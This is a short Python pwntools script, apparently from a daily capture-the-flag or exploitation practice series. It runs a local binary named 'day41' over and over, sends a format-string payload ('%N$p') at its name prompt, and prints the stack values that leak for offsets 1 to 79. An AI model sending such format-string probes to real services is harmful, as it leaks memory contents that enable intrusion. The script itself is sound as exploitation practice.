from pwn import *

context.binary = "./day41"
context.log_level = "error"

for i in range(1, 80):
	p = process("./day41")
	p.recvuntil(b"name: ")

	payload = f"%{i}$p".encode()
	p.sendline(payload)
	
	out = p.recvline(timeout = 0.5)
	print(i, out)
	p.close()
